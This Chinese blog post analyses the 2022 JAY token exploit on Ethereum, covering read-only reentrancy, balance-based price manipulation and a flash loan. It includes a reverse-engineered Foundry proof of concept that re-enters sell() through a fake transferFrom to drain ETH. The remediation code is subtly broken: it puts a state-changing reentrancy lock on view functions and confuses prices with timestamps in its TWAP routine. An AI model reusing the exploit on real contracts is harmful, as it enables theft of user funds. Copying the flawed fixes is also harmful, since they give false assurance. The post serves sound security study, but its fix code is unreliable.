做历史漏洞研究的时候发现 [**BlockSec**](https://twitter.com/BlockSecTeam)的推特上在 11, 29,
2022 监测到此攻击行为 ,真实损失仅仅  
15.32个以太币 ,仅仅 不到2万美元的损失吧

损失很小 但是漏洞非常经典  
同一次攻击中完成 只读重入 + 价格操纵 + 闪电贷攻击 个人觉得算是很好的攻击样本吧  
现在逐一分析  
[https://twitter.com/BlockSecTeam/status/1608372475225866240](https://twitter.com/BlockSecTeam/status/1608372475225866240)  
tx 信息  
<https://etherscan.io/tx/0xd4fafa1261f6e4f9c8543228a67caf9d02811e4ad3058a2714323964a8db61f6>  
![image.png](https://image.3001.net/images/20230706/1688627789_64a66a4d48f9c746b7e9e.png!small)

## 一 项目信息

 **项目地址**  
[ https://app.jaypeggers.com/dashboard](https://app.jaypeggers.com/dashboard)  
 **合约地址**  
[
https://etherscan.io/address/0xda7c0810ce6f8329786160bb3d1734cf6661ca6e#readContract](https://etherscan.io/address/0xda7c0810ce6f8329786160bb3d1734cf6661ca6e#readContract)  
 **白皮书地址**  
[
https://jaypeggers.gitbook.io/whitepaper/](https://jaypeggers.gitbook.io/whitepaper/)

Jaypeggers 是 NFT 的 减少税收损失 的一种解决方案。(纳尼 nft还收税? 美丽国的玩法搞不懂呀!)  
Jay是一种金融工具，可提供出售 NFT 所需的退出流动性。  
在 JAY 代币的支持下，Jaypeggers 使用户能够通过收获 NFT 损失来节省税收、赚取平台奖励并寻求套利。  
![image.png](https://image.3001.net/images/20230706/1688627897_64a66ab9b13f22c328529.png!small)  
用户为每件想要出售的 NFT 向 Jaypeggers 支付少量费用。  
Jaypeggers 根据所售 NFT 数量的比例向用户发行 JAY。  
这项交易使用户能够实现其 NFT 的损失，并最终减少其所得得税负担。

`简单来说就是 你要想在Jaypeggers 卖 NFTs 你就得先买 Jay`

## 二 经济模型解读

Jaypeggers 金库是 JAY 代币的支持，是与平台相关的所有交易的中心。金库从每笔交易收取的费用中获得一部分 ETH

### 2.1 JAY 代币的弹性供应

JAY 代币的铸造是为了换取 NFT，铸造 JAY 的唯一其他方式是在 Jaypeggers 应用程序上购买。购买JAY token
需要一定比例的eth，以抵消供应增加 并 平台有激励持有的机制。  
相反，当用户从 arbitrage-marketplace 购买 NFT 时，JAY 就会被烧毁。而其部分 ETH 支持将保留在金库中  
JAY代币 还可以通过 Jaypeggers 应用程序进行销售。  
当 JAY 被出售时，代币都会被烧毁，转出 的ETH其中有 小部分 将保留在金库合约中。这种销毁机制可以增加金库的价值，同时减少供应，并为持有 JAY
提供进一步的激励，从而使持有者受益

`总结1`:  
无论是**`buy/shell 操作都 扣留一部分eth存在 合约`**中 ,既抑制代币的通胀 又使平台获得了运营费用,还鼓励用户持有 真是一箭三得  
`总结2`:  
在 Jaypeggers 上只能使用JAY 代币进行交易(原理类似于q币)  
JAY铸造场景 : 在 Jaypeggers 中 buy nft的时候 ,需要用此代币 因此铸造  
JAY销毁场景: 1 卖nft 的时候 2 在 arbitrage-marketplace 购买 NFT 时 不需要继续持有JAY代币因此销毁

### 2.2 代币的流动性与套利机会

与大多数加密货币不同，JAY 交易所不依赖 CEX/DEX 上的流动性池或做市商。  
相反，交换 ETH/JAY 或 JAY/ETH 所需的流动性来自 Jaypeggers 金库和相应的铸币/销毁机制。  
虽然 Jaypeggers 并不依赖于流动性，但如上所述，JAY/USDC 流动性池将能够创造超出现有套利机会的套利机会

如果 ETH/USDC 价值增加，那么从 USDC 池中购买 JAY 会比从合约中购买 JAY 更便宜。  
由于从流动性池购买时不会铸造新代币，因此用户 应 避免在 Jaypeggers上使用 ETH 购买 JAY 时产生的费用。  
相反，如果 ETH/USDC 价值下跌 , 从 Jaypeggers 上的合约中用 ETH 购买 JAY 可能会更便宜。

## 三 代码审计

https://etherscan.io/address/0xf2919d1d80aff2940274014bef534f7791906ff2#codeJAY.sol

### 3.1 价格预言机

    
    
    function JAYtoETH(uint256 value) public view returns (uint256) {
        return (value * address(this).balance).div(totalSupply());
    }
    
    function ETHtoJAY(uint256 value) public view returns (uint256) {
        return value.mul(totalSupply()).div(address(this).balance.sub(value));
    }
    

很容易推理得出 计算公式 eth (out)数量/Jay (In)数量 = 合约中eth数量 /Jay总供应量  
那么 价格是很容易操控的. 此处还是view 函数,无重入保护 符合你只读重入 价格操控的特征  
例如 我试图获取更多的eth 只需要 `增加现在合约中eth数量`或者`减少Jay总供应量`均可以  
下面的的poc的例子就是 不断地buy/sell/buy/sell 重复 达到增加 合约中eth的目的从而 大了分子 eth out的数量

### 3.2 重入部分代码

call 函数外部可控, 攻击者回调 到喂价函数 JAYtoETH,从而价格操控

    
    
    // Sell Jay
    function sell(uint256 value) public {
        require(value > MIN, "Dude tf");
    
        //转换jay为等价的eth
        uint256 eth = JAYtoETH(value);
        _burn(msg.sender, value);
        //转给调用者 价值0.9的eth
        //攻击者在此处回调到 喂价函数JAYtoETH,从而价格操控
        (bool success, ) = msg.sender.call{value: eth.mul(90).div(100)}("");
        require(success, "ETH Transfer failed.");
        //平台自己保留 eth/33 作为保留
        (bool success2, ) = dev.call{value: eth.div(33)}("");
        require(success2, "ETH Transfer failed.");
    
        emit Price(block.timestamp, JAYtoETH(1 * 10**18));
    }
    

## 四 逆向还原POC

攻击流程如下  
![image.png](https://image.3001.net/images/20230706/1688629406_64a6709ecc8f97a4dafba.png!small)  
在编写poc的过程中,setep in 无法跟进,原因是攻击者合约没有开源,懂了原理逆向出来其实也不是很难的  
按照我上面分析的价格操纵原理 只需要`增加现在合约中eth数量`或者`减少Jay总供应量`  
明显前者攻击成本会低很多很多

![image.png](https://image.3001.net/images/20230706/1688628569_64a66d59e942b7fae749c.png!small)

https://explorer.phalcon.xyz/tx/eth/0xd4fafa1261f6e4f9c8543228a67caf9d02811e4ad3058a2714323964a8db61f6?line=47&debugLine=47

![image.png](https://image.3001.net/images/20230706/1688628605_64a66d7d3fcb47d02b076.png!small)

后发现

交易tx还原 攻击者合约  
原则就是 只需要牢记一点 操控推高币价,换以太币 跑路离场即可  
闪电贷借款 ---> sell jay token -->fallback回调 (漏洞利用开始) -->`不断 buy/sell/buy/sell JAY
token 推高 JAY/eth 的价格`  
\--> 提币拿着eth离场-->归还闪电贷

`forge test --contracts ./src/test/JAY_exp.sol -vvv`

    
    
    // SPDX-License-Identifier: UNLICENSED
    pragma solidity ^0.8.10;
    
    import "forge-std/Test.sol";
    import "./interface.sol";
    
    // @Analysis
    // https://twitter.com/BlockSecTeam/status/1608372475225866240
    
    // @TX
    // https://etherscan.io/tx/0xd4fafa1261f6e4f9c8543228a67caf9d02811e4ad3058a2714323964a8db61f6
    
    interface IJay {
        function buyJay(
            address[] memory erc721TokenAddress,
            uint256[] memory erc721Ids,
            address[] memory erc1155TokenAddress,
            uint256[] memory erc1155Ids,
            uint256[] memory erc1155Amounts
        ) external payable;
        function sell(uint256 value) external;
        function balanceOf(address account) external view returns (uint256);
    }
    
    
    contract ContractTest is DSTest{
        IJay JAY = IJay(0xf2919D1D80Aff2940274014bef534f7791906FF2);
        IBalancerVault Vault = IBalancerVault(0xBA12222222228d8Ba445958a75a0704d566BF2C8);
        WETH weth = WETH(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);
    
        CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);
    
        function setUp() public {
            cheats.createSelectFork("mainnet", 16288199);    // Fork mainnet at block 16288199
        }
    
        function testExploit() public {
            payable(address(0)).transfer(address(this).balance);
            emit log_named_decimal_uint(
                "[Start] ETH balance before exploitation:",
                address(this).balance,
                18
            );
            // Setup up flashloan paramaters.
            address[] memory tokens = new address[](1);
            tokens[0] = address(weth); 
            uint256[] memory amounts = new uint256[](1);
            amounts[0] = 72.5 ether;
            bytes memory b = "0x000000000000000000000000000000000000000000000001314fb37062980000000000000000000000000000000000000000000000000002bcd40a70853a000000000000000000000000000000000000000000000000000030927f74c9de00000000000000000000000000000000000000000000000000006f05b59d3b200000";
            // Execute the flashloan. It will return in receiveFlashLoan()
            Vault.flashLoan(address(this), tokens, amounts, b);
        }
    
        function receiveFlashLoan(
            IERC20[] memory tokens,
            uint256[] memory amounts,
            uint256[] memory feeAmounts,
            bytes memory userData
        ) external {
            require(msg.sender == address(Vault));
    
            // Transfer WETH to ETH and start the attack.
            weth.withdraw(amounts[0]);
    
            JAY.buyJay{value: 22 ether}(new address[](0),new uint256[](0),new address[](0),new uint256[](0),new uint256[](0));
    
            address[] memory erc721TokenAddress = new address[](1);
            erc721TokenAddress[0] = address(this);
    
            uint256[] memory erc721Ids = new uint256[](1);
            erc721Ids[0]= 0;
    
            //不断买入JAY后进行 买入卖出操作积累合约中存量的eth
            JAY.buyJay{value: 50.5 ether}(erc721TokenAddress, erc721Ids,new address[](0),new uint256[](0),new uint256[](0));
            JAY.sell(JAY.balanceOf(address(this)));
            JAY.buyJay{value: 3.5 ether}(new address[](0),new uint256[](0),new address[](0),new uint256[](0),new uint256[](0));
            JAY.buyJay{value: 8 ether}(erc721TokenAddress,erc721Ids,new address[](0),new uint256[](0),new uint256[](0));
            JAY.sell(JAY.balanceOf(address(this)));
    
            // Repay the flashloan by depositing ETH for WETH and transferring.
            address(weth).call{value: 72.5 ether}("deposit");
            weth.transfer(address(Vault), 72.5 ether);
    
            emit log_named_decimal_uint(
                "[End] ETH balance after exploitation:",
                address(this).balance,
                18
            );
        }
        function transferFrom(address sender, address recipient, uint256 amount) public returns (bool) {
                JAY.sell(JAY.balanceOf(address(this)));  // reenter call JAY.sell
        }
      receive() external payable {}
    }
    

## 五 漏洞修复

### 5.1 预言机重入如何修复?

最简单是还是重入锁

    
    
    modifier Mutex {
            require(!locked, "locked!");
            locked = true;
            _;
            locked = false;
        }
      function JAYtoETH(uint256 value) public  Mutex  view returns (uint256) {
        return (value * address(this).balance).div(totalSupply());
    }
    
    function ETHtoJAY(uint256 value) public Mutex view returns (uint256) {
        return value.mul(totalSupply()).div(address(this).balance.sub(value));
    }
    

### 5.2 预言机价格操纵漏洞如何修复?

https://www.paradigm.xyz/2020/11/so-you-want-to-use-a-price-oracle

#### a 时间加权平均价格(TWAP)

TWAP, 一个资产在一小时内的平均价格

虽然这可以防止闪电贷歪曲预言机价格，因为闪电贷只存在于一个交易或区块中，而TWAP是多个区块的平均值，但这并不是一个完整的解决方案，因为TWAP有其自身的妥协。

在价格剧烈波动时期，TWAP预言会变得不准确，这可能会导致下游事件——如无法在期限内清偿抵押不足的贷款。

    
    
    // 定义一个结构体来存储价格和时间戳
    struct PriceData {
        uint256 price;
        uint256 timestamp;
    }
    
    // 定义一个数组来存储价格数据
    PriceData[] public priceData;
    
    // 定义一个函数来计算 TWAP
    function getTWAP(uint256 _startTime, uint256 _endTime) public view returns (uint256) {
        uint256 totalValue = 0;
        uint256 totalTime = 0;
        uint256 lastPrice = 0;
    
        // 遍历价格数据数组，计算 TWAP
        for (uint256 i = 0; i < priceData.length; i++) {
            if (priceData[i].timestamp >= _startTime && priceData[i].timestamp <= _endTime) {
                if (lastPrice != 0) {
                    totalValue += ((priceData[i].timestamp - lastPrice) * lastPrice);
                    totalTime += (priceData[i].timestamp - lastPrice);
                }
                lastPrice = priceData[i].price;
            }
        }
    
        if (lastPrice != 0) {
            totalValue += ((_endTime - lastPrice) * lastPrice);
            totalTime += (_endTime - lastPrice);
        }
    
        return totalValue / totalTime;
    }
    
    // 定义一个函数来添加价格数据
    function addPriceData(uint256 _price, uint256 _timestamp) public {
        priceData.push(PriceData(_price, _timestamp));
    }
    

#### b 增加交易延迟

操纵价格预言机是一个对时间敏感的操作。如果攻击者想把风险降到最低，他们会希望在单笔交易中完成操纵价格预言机所需的两笔交易。作为协议开发者,可能只需要将用户进出系统之间的时间间隔，设置在一个区块以上就可以了

#### c chainLink 预言机喂入价格

具体不介绍了 可以参照官方文档

#### d 重新规划 代币算法

注意:此方法是我个人思路的结论 切勿将此轻易用于生产环境中

原始漏洞算法是 `eth (out)数量/Jay (In)数量 = 合约中eth数量 /Jay总供应量`  
`开二次根号/三次更高`迅速提升攻击成本  
![image.png](https://image.3001.net/images/20230706/1688628836_64a66e649c4c5d7ca3de1.png!small)

#### e 仅允许eoa账户进行访问

想要拒绝外部合约调用当前合约则可使用require（tx.origin ==msg.sender）来进行实现。  
但是这样的difi 还有吸引力吗 因此个人不推荐

